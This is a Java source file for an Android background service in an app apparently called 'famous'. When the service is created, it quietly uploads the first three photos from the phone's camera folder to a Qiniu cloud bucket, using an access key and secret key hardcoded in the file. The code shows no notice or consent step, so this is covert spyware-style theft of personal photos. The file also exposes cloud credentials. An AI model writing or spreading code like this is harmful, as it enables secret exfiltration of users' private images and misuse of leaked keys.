package top.liuyun.famous;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.qiniu.android.common.Zone;
import com.qiniu.android.http.ResponseInfo;
import com.qiniu.android.storage.Configuration;
import com.qiniu.android.storage.UpCompletionHandler;
import com.qiniu.android.storage.UploadManager;
import com.qiniu.android.utils.StringMap;

import org.json.JSONObject;

import java.io.File;

/**
 * This Service is Persistent Service. Do some what you want to do here.<br/>
 *
 * Created by Mars on 12/24/15.
 */
public class Service1 extends Service{
    private Auth auth;
    private String bucketname;
    private File data;

    @Override
    public void onCreate() {
        super.onCreate();
        String ak = "3VBxoLrJVIeJHiZKLLwpqIxXJbrMxIusBkxneFCq";
        String sk = "iU2YWesOhDf1GP4uspH4Pvc_HJwZicUg8BbEki63";
        auth = Auth.create(ak, sk);
        //空间名
        bucketname = "liushiyun-images";
        // 重用uploadManager。一般地，只需要创建一个uploadManager对象
        UploadManager uploadManager = new UploadManager(new Configuration.Builder().zone(Zone.zone1).build());
        File[] files = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM+"/Camera").listFiles();
        String token = getUpToken();
        for (int i = 0; i <3; i++) {
            String path = files[i].getAbsolutePath();
            uploadManager.put(path,files[i].getName(), token, new UpCompletionHandler() {
                @Override
                public void complete(String key, ResponseInfo info, JSONObject response) {
                    Log.e("HHHHHHHHHHHHHHHHHHH",key+":"+info+":"+response);
                }
            },null);
            Log.e("TTTTTTTTTTTT",files[i].getAbsolutePath());
        }
    }

    public String getUpToken() {
        return auth.uploadToken(bucketname, null, 3600, new StringMap().put("insertOnly", 1));
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.e("tttttttttt","start");
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.e("dddddddddddd","destroy");
    }
}
